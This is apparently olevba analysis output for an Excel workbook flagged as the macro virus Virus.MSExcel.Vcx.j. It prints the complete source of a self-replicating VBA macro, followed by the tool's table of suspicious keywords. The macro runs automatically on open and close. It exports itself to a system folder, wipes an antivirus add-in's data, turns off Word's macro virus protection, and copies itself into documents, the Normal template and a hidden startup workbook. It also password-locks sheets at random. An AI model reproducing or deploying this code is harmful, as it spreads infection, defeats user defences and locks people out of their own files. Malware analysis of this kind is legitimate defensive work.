olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Vcx.j-6b6af789c20d3dec8a20f0da750abbb295c8e54f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Vcx.j-6b6af789c20d3dec8a20f0da750abbb295c8e54f - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Vcx.j-6b6af789c20d3dec8a20f0da750abbb295c8e54f - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Vcx.j-6b6af789c20d3dec8a20f0da750abbb295c8e54f - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Vcx.j-6b6af789c20d3dec8a20f0da750abbb295c8e54f - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NEWMAC.bas 
in file: Virus.MSExcel.Vcx.j-6b6af789c20d3dec8a20f0da750abbb295c8e54f - OLE stream: '_VBA_PROJECT_CUR/VBA/NEWMAC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim k As Long
Dim s As Long
Dim u As Long
Dim a As Long
Dim b As String
 

Sub Auto_Open()
    Application.OnSheetActivate = "NEWMAC.AutoCCC"
End Sub

Sub AutoCCC()
Attribute AutoCCC.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    b = String(7, 0)
    s = 256
    v$ = String$(s, 0)
    Application.ScreenUpdating = False
    Application.EnableCancelKey = wdCancelDisabled
    Application.DisplayAlerts = wdAlertsNone
    Application.VBE.ActiveVBProject.VBComponents("NEWMAC").Export "c:\Windows\System\NEWMAC.386"
    Workbooks("MV_Vaccine.xla").Sheets("ѕЖАМДЬ").Columns("E:H").ClearContents
    Workbooks("MV_Vaccine.xla").Save
    
god:
    On Error GoTo god_1
    If ActiveDocument = "" Then GoTo god_3
        
    With Options
        .VirusProtection = False
        .ConfirmConversions = False
        .SaveNormalPrompt = False
    End With
    
    ActiveDocument.ReadOnlyRecommended = False
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "NEWMAC" Then r = True
    Next i
    
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "NEWMAC" Then e = True
    Next i
    
    If e = False Then
        With ActiveDocument.VBProject
            With .VBComponents.Import("c:\Windows\System\NEWMAC.386")
            End With
        End With
        
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
    If r = False Then
        With NormalTemplate.VBProject
            With .VBComponents.Import("c:\Windows\System\NEWMAC.386")
            End With
        End With
    End If
        
    GoTo god_1
    
god_3:
    If Dir(Application.StartupPath + "\NEWMAC.xls") = "NEWMAC.xls" Then p = True
    
    For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
        If ActiveWorkbook.VBProject.VBComponents(i).Name = "NEWMAC" Then t = True
    Next i
    
    If t = False Then
        With ActiveWorkbook.VBProject
            With .VBComponents.Import("c:\Windows\System\NEWMAC.386")
            End With
        End With
    End If
    
    If p = False Then
        Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\NEWMAC.xls"
        With ActiveWorkbook.VBProject
            With .VBComponents.Import("c:\Windows\System\NEWMAC.386")
            End With
        End With
    
        ActiveWindow.Visible = False
        Workbooks("NEWMAC.xls").Save
    End If
    
    If b = ".False." Then GoTo god_1
    
god_1:
toend:
End Sub

Sub AutoExit()
    Call AutoCCC
End Sub

Sub Auto_Close()
    On Error Resume Next
    Randomize
    NNNN = Rnd(300)
    ActiveWorkbook.Sheets(1).Protect NNNN
End Sub

Sub AutoClose()
    On Error Resume Next
    Randomize
    NNNN = Rnd(300)
    ActiveWorkbook.Sheets(1).Protect NNNN
End Sub

Sub ToolsMacro()
End Sub

Sub FileTemplates()
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

